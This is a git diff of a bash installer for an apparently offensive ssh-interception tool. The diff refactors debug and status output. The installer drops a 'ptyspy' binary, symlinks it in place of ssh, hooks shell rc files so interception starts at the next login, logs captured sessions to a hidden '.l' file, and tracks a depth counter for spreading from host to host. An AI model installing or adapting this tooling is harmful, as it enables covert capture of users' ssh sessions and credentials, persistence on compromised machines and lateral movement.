@@ -12,16 +12,18 @@ CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
 
-DEBUGF()
-{
-	[[ -z $THC_DEBUG ]] && return
-	echo >&2 "$@"
-}
+if [[ -z $THC_DEBUG ]]; then
+	DEBUGF(){ :;}
+	DEBUGF_R(){ :;}
+else
+	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
+	DEBUGF_R(){ echo -e "${CY}DEBUG:${CN} ${CR}$*${CN}";}
+fi
 
-DEBUGF_R()
+OK_OUT()
 {
-	[[ -z $THC_DEBUG ]] && return
-	echo -e >&2 "${CR}$@${CN}"
+	echo -e 1>&2 "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
 }
 
 rcfile_add()
@@ -110,6 +112,7 @@ osarch()
 # 	[[ -z $valid_param ]] && 
 # fi
 
+[[ -n $THC_LOCAL ]] && echo -en 2>&1 "Installing binaries..................................................."
 
 # Find a writeable base dir
 try_basedir "${THC_BASEDIR}" || \
@@ -140,7 +143,7 @@ if [[ "$1" = "uninstall" ]]; then
 	[[ -n $IS_INSTALLED_RCFILE_USER   ]] && rcfile_del "$RCFILE_USER"
 	[[ -n $IS_INSTALLED_RCFILE_SYSTEM ]] && rcfile_del "$RCFILE_SYSTEM"
 	echo -e "--> You may want to clean up with"
-	echo -e "--> \033[1;36mrm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo thc_set1\033[0m"
+	echo -e "--> ${CC}rm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo thc_set1${CN}"
 	exit 0
 fi
 
@@ -207,14 +210,13 @@ THC_DEPTH_REMOTE="$THC_DEPTH"
 # Check if local THC_DEPTH already exists and only update new
 # DEPTH is LARGER to prevent DEPTH hitting 0 if A connects -> B -> A -> B..
 source "${THC_BASEDIR}/depth.cfg" 2>/dev/null || unset THC_DEPTH
-echo "T=$THC_DEPTH"
 [[ -n $THC_FORCE_UPDATE ]] && unset THC_DEPTH # always use THC_DEPTH_REMOTE
 if [[ $THC_DEPTH_REMOTE > $THC_DEPTH ]]; then
 	echo "THC_DEPTH=${THC_DEPTH_REMOTE}" >"${THC_BASEDIR}/depth.cfg"
 	THC_DEPTH="$THC_DEPTH_REMOTE"
-	echo >&2 "Setting THC_DEPTH=$THC_DEPTH"
+	DEBUGF "Setting THC_DEPTH=$THC_DEPTH"
 else
-	echo >&2 "Keeping THC_DEPTH=$THC_DEPTH (REMOTE wants $THC_DEPTH_REMOTE)"
+	DEBUGF "Keeping THC_DEPTH=$THC_DEPTH (REMOTE wants $THC_DEPTH_REMOTE)"
 fi
 
 OSARCH=$(osarch)
@@ -225,11 +227,18 @@ THC_EXEC_TEST=1 "${THC_BASEDIR}/ptyspy_bin.${OSARCH}" 2>/dev/null  || { echo >&2
 ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"
 
 if [[ -n $THC_LOCAL ]]; then
-	echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}."
-	echo -e "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}"
-	echo -e "--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove."
-	echo -e "--> Intercepting will start on next log in or to start right"
-	echo -e "    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
+	OK_OUT
+	echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.
+--> Logging to ${CY}${THC_BASEDIR}/.l${CN}
+--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove.
+--> Intercepting will start on next log in or to start right
+    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
+
+	# echo -e "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}."
+	# echo -e "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}"
+	# echo -e "--> Type ${CC}${THC_BASEDIR}/x.sh uninstall${CN} to remove."
+	# echo -e "--> Intercepting will start on next log in or to start right"
+	# echo -e "    now type ${CC}source ${THC_BASEDIR}/seed${CN}."
 fi
 
 exit 0
